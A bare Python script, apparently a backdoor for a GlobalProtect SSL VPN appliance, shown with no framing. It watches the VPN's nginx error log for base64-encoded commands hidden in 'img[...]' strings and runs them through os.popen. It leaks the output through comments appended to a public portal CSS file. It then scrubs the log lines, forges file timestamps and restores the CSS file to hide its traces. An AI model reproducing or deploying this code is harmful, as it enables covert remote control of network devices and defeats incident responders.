def __main():
    import threading,time,os,re,base64



    def restore(css_path,content,atime,mtime):
        import os,time
        time.sleep(15)
        with open(css_path,'w') as f:
            f.write(content)
        os.utime(css_path,(atime,mtime))
        

        
    def __is_whole_hour():
        from datetime import datetime
        current_time = datetime.now().time()
        return current_time.minute != 0 and current_time.second == 0
    css_path = '/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css'
    content = open(css_path).read()
    atime=os.path.getatime(css_path)
    mtime=os.path.getmtime(css_path)

    while True:
        try:
            SHELL_PATTERN = 'img\[([a-zA-Z0-9+/=]+)\]'
            lines = []
            WRITE_FLAG = False
            for line in open("/var/log/pan/sslvpn_ngx_error.log",errors="ignore").readlines():
                rst = re.search(SHELL_PATTERN,line)
                if rst:
                    WRITE_FLAG = True
                    cmd = base64.b64decode(rst.group(1)).decode()
                    try:
                        output = os.popen(cmd).read()
                        with open(css_path,"a") as f:
                            f.write("/*"+output+"*/")
                    except Exception as e:
                        pass

                    continue
                lines.append(line)
            if WRITE_FLAG:
                atime=os.path.getatime("/var/log/pan/sslvpn_ngx_error.log")
                mtime=os.path.getmtime("/var/log/pan/sslvpn_ngx_error.log")

                with open("/var/log/pan/sslvpn_ngx_error.log","w") as f:
                    f.writelines(lines)
                os.utime("/var/log/pan/sslvpn_ngx_error.log",(atime,mtime))
                import threading
                threading.Thread(target=restore,args=(css_path,content,atime,mtime)).start()
        except:
            pass
        time.sleep(2)


import threading,time
threading.Thread(target=__main).start()

